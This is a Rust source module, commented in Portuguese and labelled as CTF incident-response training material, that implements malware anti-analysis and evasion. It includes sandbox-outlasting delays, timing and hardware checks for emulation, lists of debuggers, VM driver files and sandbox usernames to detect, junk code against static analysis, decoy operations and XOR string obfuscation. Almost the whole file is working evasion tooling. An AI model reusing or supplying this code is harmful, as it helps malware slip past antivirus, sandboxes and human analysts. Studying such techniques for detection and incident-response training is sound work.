//! Evasion Module - Anti-Detection Techniques
//!
//! Técnicas para evitar detecção por antivírus e sandboxes.
//! ⚠️ EDUCATIONAL PURPOSES ONLY - CTF IR Training

#![allow(dead_code)]

use std::time::{Duration, Instant};
use std::thread;

/// Delay inicial antes de executar (evita sandboxes com timeout curto)
pub fn initial_delay() {
    // Sandboxes geralmente têm timeout de 30-60 segundos
    // Um delay de 2-5 segundos pode fazer parecer um app normal
    let delay = Duration::from_millis(2500 + (rand::random::<u64>() % 2500));
    thread::sleep(delay);
}

/// Verifica se está em ambiente de análise baseado em timing
pub fn timing_evasion() -> bool {
    let start = Instant::now();
    
    // Operação que deveria ser rápida
    let mut dummy = 0u64;
    for i in 0..50000 {
        dummy = dummy.wrapping_add(i);
        dummy = dummy.wrapping_mul(0x5851F42D4C957F2D);
    }
    std::hint::black_box(dummy);
    
    let elapsed = start.elapsed();
    
    // Se demorou muito, provavelmente está sendo emulado
    elapsed > Duration::from_millis(500)
}

/// Verifica número de CPUs (VMs/sandboxes geralmente têm poucas)
pub fn check_cpu_count() -> bool {
    let cpus = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    
    // Menos de 2 CPUs é suspeito
    cpus < 2
}

/// Verifica memória disponível
#[cfg(windows)]
pub fn check_memory() -> bool {
    use sysinfo::System;
    let sys = System::new_all();
    let total_mem = sys.total_memory();
    
    // Menos de 2GB é suspeito (sandbox)
    total_mem < 2 * 1024 * 1024 * 1024
}

#[cfg(not(windows))]
pub fn check_memory() -> bool {
    use sysinfo::System;
    let sys = System::new_all();
    let total_mem = sys.total_memory();
    total_mem < 2 * 1024 * 1024 * 1024
}

/// Verifica tamanho do disco
pub fn check_disk_size() -> bool {
    #[cfg(windows)]
    {
        // Menos de 50GB é suspeito
        if let Ok(output) = std::process::Command::new("wmic")
            .args(["diskdrive", "get", "size"])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                if let Ok(size) = line.trim().parse::<u64>() {
                    if size < 50 * 1024 * 1024 * 1024 {
                        return true;
                    }
                }
            }
        }
    }
    false
}

/// Verifica se há interação de mouse (sandboxes não têm)
#[cfg(windows)]
pub fn check_mouse_movement() -> bool {
    use std::time::Duration;
    
    // Espera um pouco e verifica se o cursor se moveu
    // Implementação simplificada - em produção usaria GetCursorPos
    thread::sleep(Duration::from_millis(100));
    false // Simplificado para CTF
}

#[cfg(not(windows))]
pub fn check_mouse_movement() -> bool {
    false
}

/// Junk code para confundir análise estática
#[inline(never)]
pub fn junk_operations() {
    let mut arr = [0u8; 256];
    for i in 0..256 {
        arr[i] = (i as u8).wrapping_mul(0x41);
    }
    
    let mut sum = 0u64;
    for &b in &arr {
        sum = sum.wrapping_add(b as u64);
        sum = sum.rotate_left(3);
    }
    
    std::hint::black_box(sum);
    std::hint::black_box(arr);
}

/// Decoy operations que parecem legítimas
pub fn decoy_file_operations() {
    // Faz operações que apps normais fariam
    let _ = std::env::current_dir();
    let _ = std::env::current_exe();
    let _ = std::env::var("PATH");
    let _ = std::env::var("USERPROFILE");
    
    #[cfg(windows)]
    {
        let _ = std::fs::metadata("C:\\Windows\\System32\\kernel32.dll");
        let _ = std::fs::metadata("C:\\Windows\\System32\\ntdll.dll");
    }
    
    #[cfg(unix)]
    {
        let _ = std::fs::metadata("/etc/passwd");
        let _ = std::fs::metadata("/bin/sh");
    }
}

/// String decryption em runtime (mais seguro que compile-time)
pub fn decrypt_string(encrypted: &[u8], key: u8) -> String {
    let decrypted: Vec<u8> = encrypted.iter().map(|b| b ^ key).collect();
    String::from_utf8_lossy(&decrypted).to_string()
}

/// Macro para criar strings encriptadas inline
#[macro_export]
macro_rules! enc_str {
    ($s:expr, $key:expr) => {{
        const S: &str = $s;
        const KEY: u8 = $key;
        let bytes: Vec<u8> = S.bytes().map(|b| b ^ KEY).collect();
        bytes
    }};
}

/// Verifica processos de análise conhecidos
pub fn check_analysis_processes() -> bool {
    let suspicious = [
        "wireshark", "fiddler", "burp", "charles",
        "procmon", "procexp", "processhacker", "x64dbg", "x32dbg",
        "ollydbg", "ida", "ghidra", "radare2", "immunity",
        "pestudio", "die", "exeinfope", "cff explorer",
        "regshot", "autoruns", "tcpview",
    ];
    
    #[cfg(windows)]
    {
        if let Ok(output) = std::process::Command::new("tasklist").output() {
            let tasks = String::from_utf8_lossy(&output.stdout).to_lowercase();
            for proc in suspicious {
                if tasks.contains(proc) {
                    return true;
                }
            }
        }
    }
    
    #[cfg(unix)]
    {
        if let Ok(output) = std::process::Command::new("ps").args(["aux"]).output() {
            let procs = String::from_utf8_lossy(&output.stdout).to_lowercase();
            for proc in suspicious {
                if procs.contains(proc) {
                    return true;
                }
            }
        }
    }
    
    false
}

/// Verifica arquivos de sandbox conhecidos
pub fn check_sandbox_files() -> bool {
    #[cfg(windows)]
    {
        let sandbox_files = [
            "C:\\windows\\system32\\drivers\\vmmouse.sys",
            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
            "C:\\windows\\system32\\drivers\\vboxmouse.sys",
            "C:\\windows\\system32\\drivers\\vboxguest.sys",
            "C:\\windows\\system32\\drivers\\vboxsf.sys",
            "C:\\agent\\agent.pyw",
            "C:\\sandbox",
            "C:\\analysis",
        ];
        
        for path in sandbox_files {
            if std::path::Path::new(path).exists() {
                return true;
            }
        }
    }
    
    false
}

/// Verifica usernames de sandbox
pub fn check_sandbox_username() -> bool {
    let user = whoami::username().to_lowercase();
    let suspicious_users = [
        "sandbox", "virus", "malware", "sample", "test",
        "user", "currentuser", "admin", "administrator",
        "john", "jane", "peter", "cuckoo", "analyst",
        "vmware", "virtual", "analysis", "honey",
    ];
    
    for sus in suspicious_users {
        if user == sus || user.contains(sus) {
            return true;
        }
    }
    
    false
}

/// Executa todas as verificações de evasão
pub fn run_all_checks() -> EvasionResult {
    let mut result = EvasionResult::default();
    
    // Junk operations para confundir
    junk_operations();
    
    result.timing_anomaly = timing_evasion();
    result.low_cpu = check_cpu_count();
    result.low_memory = check_memory();
    result.small_disk = check_disk_size();
    result.analysis_tools = check_analysis_processes();
    result.sandbox_files = check_sandbox_files();
    result.sandbox_user = check_sandbox_username();
    
    // Decoy ops
    decoy_file_operations();
    
    result
}

#[derive(Debug, Default)]
pub struct EvasionResult {
    pub timing_anomaly: bool,
    pub low_cpu: bool,
    pub low_memory: bool,
    pub small_disk: bool,
    pub analysis_tools: bool,
    pub sandbox_files: bool,
    pub sandbox_user: bool,
}

impl EvasionResult {
    /// Retorna true se qualquer indicador de análise for detectado
    pub fn is_being_analyzed(&self) -> bool {
        self.timing_anomaly || 
        self.low_cpu || 
        self.low_memory || 
        self.analysis_tools || 
        self.sandbox_files ||
        self.sandbox_user
    }
    
    /// Conta quantos indicadores foram detectados
    pub fn detection_count(&self) -> u32 {
        let mut count = 0;
        if self.timing_anomaly { count += 1; }
        if self.low_cpu { count += 1; }
        if self.low_memory { count += 1; }
        if self.small_disk { count += 1; }
        if self.analysis_tools { count += 1; }
        if self.sandbox_files { count += 1; }
        if self.sandbox_user { count += 1; }
        count
    }
}
